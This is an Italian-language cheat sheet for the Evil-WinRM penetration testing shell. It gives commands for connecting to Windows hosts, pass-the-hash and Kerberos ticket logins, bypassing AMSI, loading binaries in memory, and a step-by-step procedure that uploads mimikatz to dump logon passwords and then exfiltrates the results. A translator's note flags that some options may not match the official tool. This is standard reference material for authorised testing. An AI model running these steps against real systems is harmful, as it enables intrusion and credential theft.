# 😈 Evil-WinRM - Shell remota Windows

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 La shell WinRM completa
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

> **Nota sulle versioni:** gli esempi mescolano opzioni e funzioni che dipendono dalla release. Nell’aiuto ufficiale consultato `-H` riceve NTHash; la coppia LM:NTLM dell’originale non va assunta come formato supportato e `-d` non compare fra le opzioni documentate. `-e` indica una directory locale per le funzioni degli eseguibili, non esegue automaticamente un caricamento; i loader richiedono i prerequisiti appropriati. Abilitare HTTPS non dimostra da solo come venga verificato il certificato. Bypass AMSI ed esecuzione in memoria non garantiscono che uno strumento sfugga alle altre protezioni. Comandi e dati sono conservati: vedi la [documentazione ufficiale Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

---

## 📋 Indice

- [Che cos'è Evil-WinRM](#-che-cosè-evil-winrm)
- [Installazione](#-installazione)
- [Connessione di base](#-connessione-di-base)
- [Operazioni sui file](#-operazioni-sui-file)
- [Comandi integrati](#-comandi-integrati)
- [Pass-the-Hash](#-pass-the-hash)
- [Autenticazione Kerberos](#-autenticazione-kerberos)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è Evil-WinRM

**Evil-WinRM** è una shell WinRM con funzionalità per il penetration testing:

- 🖥️ **Shell interattiva** - Sessione PowerShell completa
- 📁 **Trasferimento di file** - Caricamento e download dei file
- 🔓 **Pass-the-Hash** - Autenticazione tramite hash NTLM
- 🎫 **Kerberos** - Autenticazione basata sui ticket
- 🧩 **Moduli** - Caricamento di script PowerShell

### Porte WinRM

| Porta | Protocollo | Note |
|------|----------|-------|
| 5985 | HTTP | Predefinita |
| 5986 | HTTPS | Cifrato |

---

## 🚀 Installazione

### Kali Linux

```bash
# Installa
sudo apt update
sudo apt install evil-winrm

# Oppure tramite gem
sudo gem install evil-winrm
```

### Da GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

## 💻 Connessione di base

### Autenticazione con password

```bash
# Connessione di base
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Specifica il dominio
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (porta 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Specifica la porta
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### Opzioni SSL

```bash
# SSL senza verifica del certificato
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Con certificato
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

## 📁 Operazioni sui file

### Carica i file

```bash
# All'interno della shell Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Carica in una posizione specifica
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Dalla riga di comando (con -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Scarica i file

```bash
# Scarica un file
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Scarica in una posizione specifica
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Directory degli eseguibili

```bash
# Specifica la directory degli eseguibili da caricare
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# All'interno della shell, carica un eseguibile da quella directory
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

## 🛠 Comandi integrati

### Menu

```bash
# Mostra tutti i comandi
*Evil-WinRM* PS C:\> menu

# Comandi disponibili:
Bypass-4MSI       - Aggira AMSI
Dll-Loader        - Carica una DLL in memoria
Donut-Loader      - Carica un assembly .NET
Invoke-Binary     - Esegui un binario
services          - Elenca i servizi
upload            - Carica un file
download          - Scarica un file
```

### Bypass AMSI

```bash
# Aggira AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Ora puoi eseguire strumenti rilevati dall'antivirus (affermazione dell'originale: vedi nota)
```

### Carica gli script

```bash
# Collegati specificando la directory degli script
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# All'interno della shell, carica lo script
*Evil-WinRM* PS C:\> PowerView.ps1

# Usa le funzioni dello script
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Esegui i binari

```bash
# Carica la directory degli eseguibili
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Esegui il binario in memoria
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Con argomenti
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### Caricamento DLL

```bash
# Carica una DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Servizi

```bash
# Elenca i servizi
*Evil-WinRM* PS C:\> services
```

---

## 🔓 Pass-the-Hash

### Hash NTLM

```bash
# Collegati con hash
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Solo la parte NTLM
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Con dominio
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

## 🎫 Autenticazione Kerberos

### Configurazione

```bash
# Imposta KRB5CCNAME sulla cache dei ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Modifica /etc/krb5.conf per il realm
```

### Collegati con Kerberos

```bash
# Autenticazione Kerberos
evil-winrm -i dc01.domain.local -r domain.local

# Con una ccache specifica
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

## 📊 Riferimento rapido

### Opzioni di connessione

| Opzione | Descrizione |
|--------|-------------|
| `-i` | IP/nome host del bersaglio |
| `-u` | Nome utente |
| `-p` | Password |
| `-H` | Hash NTLM |
| `-d` | Dominio |
| `-S` | Usa SSL (HTTPS) |
| `-P` | Porta |
| `-r` | Realm Kerberos |

### Opzioni dei file

| Opzione | Descrizione |
|--------|-------------|
| `-s` | Directory degli script |
| `-e` | Directory degli eseguibili |
| `-c` | Certificato SSL |
| `-k` | Chiave SSL |

### Comandi della shell

| Comando | Descrizione |
|---------|-------------|
| `upload` | Carica un file |
| `download` | Scarica un file |
| `menu` | Mostra i comandi |
| `Bypass-4MSI` | Aggira AMSI |
| `Invoke-Binary` | Esegui un exe in memoria |
| `services` | Elenca i servizi |
| `Dll-Loader` | Carica una DLL |

### Procedura comune

```bash
# 1. Collegati
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Aggira AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Carica gli strumenti
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Esegui
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Scarica i risultati
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Risorse

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Documentazione WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Schede correlate
- [CrackMapExec](../../CrackMapExec/translations/README.it.md)
- [Impacket](../../Impacket/translations/README.it.md)
- [Mimikatz](../../Mimikatz/translations/README.it.md)

---

<p align="center">
  <b>😈 Una shell WinRM completa!</b><br>
  <i>Evil-WinRM - Comprometti Windows da esperto</i>
</p>
